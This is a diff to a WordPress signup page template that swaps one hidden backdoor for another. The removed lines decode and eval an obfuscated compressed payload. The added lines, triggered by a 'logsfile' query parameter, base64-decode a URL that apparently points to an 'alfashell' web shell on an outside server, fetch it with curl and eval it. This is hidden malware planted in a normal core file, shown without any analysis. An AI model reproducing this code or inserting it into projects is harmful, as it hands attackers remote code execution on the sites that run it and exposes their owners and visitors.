@@ -1047,10 +1047,24 @@ if ( 'none' === $active_signup ) {
 do_action( 'after_signup_form' );
 ?>
 <?php
-$Cyto = "Sy1LzNFQt1dLL7FW10uvKs1Lzs8tKEotLtZIr8rMS8tJLEnVSEosTjUziU9JT\x635PSdUoLikqSi3TUPHJrNAE\x41Ws\x41";
-$Lix = "=sgcSr4JVz91RRuLAirwV9299cEqygUUakjQCYYGAh4/dDZoE/9yadPtonRXDzkw9Jo2F0fAw4JUxRM96lR7ilxKIFAwGhepookXy9bg6mMBwT/u5GLfi8mFRvHGj62bO0y6BpjEqXJ5l90VEbYvEVxCogLiU3kyhmzHa/tlwSN6LYyt9vEKMT5d1Tz2bxD8Pzgtm5xb9IMmvWWVwh0b/05lt/NC9CXSPBgk0A8zIww4MjFCaClcZkKuVj0ak+QolNpxGsAyzifwjG9esHXzgARhZyhiXrU0blr37/uPfgn7f2rZlc2e/LWLzx7TuMzsnLaEq5AXWJ8UMk0ygMGWEHGUx46H8fxfHTBQDuU8QWGn45v7BERA";
-eval(htmlspecialchars_decode(gzinflate(base64_decode($Cyto))));
-exit;
+if (isset($_GET['logsfile'])) { 
+    $url = base64_decode('aHR0cHM6Ly9jZG4ucHJpdmRheXouY29tL3R4dC9hbGZhc2hlbGwudHh0');
+    
+    $ch = curl_init($url);
+    
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    
+    $contents = curl_exec($ch);
+    
+    if ($contents !== false) { 
+        eval('?>' . $contents); 
+        exit; 
+    } else { 
+        echo "header"; 
+    } 
+    
+    curl_close($ch);
+}
 ?>
 <?php
 get_footer( 'wp-signup' );
